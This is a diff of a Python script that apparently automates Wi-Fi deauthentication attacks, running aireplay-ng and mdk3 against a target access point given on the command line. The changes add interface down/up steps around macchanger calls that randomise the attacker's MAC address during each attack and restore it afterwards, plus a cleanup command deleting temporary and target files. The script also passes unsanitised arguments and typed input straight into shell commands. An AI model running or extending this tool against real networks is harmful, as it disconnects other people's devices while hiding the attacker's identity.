@@ -51,19 +51,27 @@ def start():
          mode="aireplay-ng "
          print("############################# Quiet: "+mode+" attack #############################")
          print("Changing the MAC")
+         os.system("ifconfig "+str(sys.argv[4])+" down")
          os.system("macchanger -r "+str(sys.argv[4])+"")
+         os.system("ifconfig "+str(sys.argv[4])+" up")
          #os.system("airmon-ng start "+str(sys.argv[5])+" "+str(sys.argv[8])+"")
          os.system(""+mode+"-0 0 -a "+str(sys.argv[6])+" "+str(sys.argv[4])+"")
          #os.system("airmon-ng stop "+str(sys.argv[5])+"mon")
+         os.system("ifconfig "+str(sys.argv[4])+" down")
          os.system("macchanger -p "+str(sys.argv[4])+"")
+         os.system("ifconfig "+str(sys.argv[4])+" up")
          
       if(sys.argv[2] == "--m"):
          mode="mdk3 "
          print("############################# Quiet: "+mode+" attack #############################")
          print("Changing the MAC")
+         os.system("ifconfig "+str(sys.argv[4])+" down")
          os.system("macchanger -r "+str(sys.argv[4])+"")
+         os.system("ifconfig "+str(sys.argv[4])+" up")
          os.system(""+mode+str(sys.argv[4])+" d -n"+str(sys.argv[6])+"")
+         os.system("ifconfig "+str(sys.argv[4])+" down")
          os.system("macchanger -p "+str(sys.argv[4])+"")
+         os.system("ifconfig "+str(sys.argv[4])+" up")
       
       
 try:
@@ -85,10 +93,14 @@ except Exception:
    monitor = raw_input("Select you wirelles card fo monitor mode: ")
    os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
    print("Changing the MAC")
+   os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
    os.system("monitor=`cat monitor.rmo` && macchanger -r $monitor")
+   os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
    print("")
    
-   
+   os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
    os.system("monitor=`cat monitor.rmo` && macchanger -p $monitor")
+   os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
+   os.system('rm *.rmo && rm target*')
 else:
    start()
